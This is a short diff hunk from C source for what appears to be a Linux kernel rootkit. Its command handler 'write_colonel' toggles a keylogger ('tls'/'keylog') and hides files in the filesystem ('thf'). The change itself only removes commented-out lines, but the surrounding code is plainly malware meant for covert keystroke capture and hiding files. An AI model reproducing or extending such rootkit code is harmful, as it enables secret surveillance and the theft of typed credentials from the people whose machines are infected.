@@ -194,9 +194,6 @@ static int write_colonel(struct file *file, const char __user *buff, unsigned lo
 		if (current_pid > 0) current_pid--;
 
 	} else if ((!strncmp(buff, "tls", MIN(3, count))) || (!strncmp(buff, "keylog", MIN(6, count)))) {	/* toggle keylogger on/off */
-		// if (1 == key_logger) {
-		// 	if (current_pid > 0) current_pid--;
-		// }
 		key_logger = !key_logger;
 
 	} else if (!strncmp(buff, "thf", MIN(3, count))) {					/* toggles hidden_files in fs */
